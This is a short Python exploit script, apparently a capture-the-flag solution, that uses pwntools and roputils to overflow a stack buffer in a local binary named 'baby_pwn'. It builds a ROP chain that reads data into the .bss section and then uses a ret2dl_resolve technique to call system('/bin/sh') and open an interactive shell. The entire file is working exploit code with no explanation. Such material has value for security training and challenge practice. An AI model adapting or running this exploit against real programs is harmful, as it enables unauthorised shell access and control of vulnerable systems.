#! /usr/bin/python

from pwn import *
from roputils import *

p = process('./baby_pwn')
rop = ROP('./baby_pwn')
elf = ELF('./baby_pwn')
context.log_level = 'debug'

offset = 0x28 + 0x4  #offset+ebp
bss = rop.section('.bss')


buf = rop.fill(offset)
buf+= rop.call('read',0,bss,100)
buf+= rop.dl_resolve_call(bss+20,bss)
p.sendline(buf)


buf = rop.string('/bin/sh')
buf+= rop.fill(20,buf)
buf+= rop.dl_resolve_data(bss+20,'system')
buf+= rop.fill(100,buf)
p.sendline(buf)


p.interactive()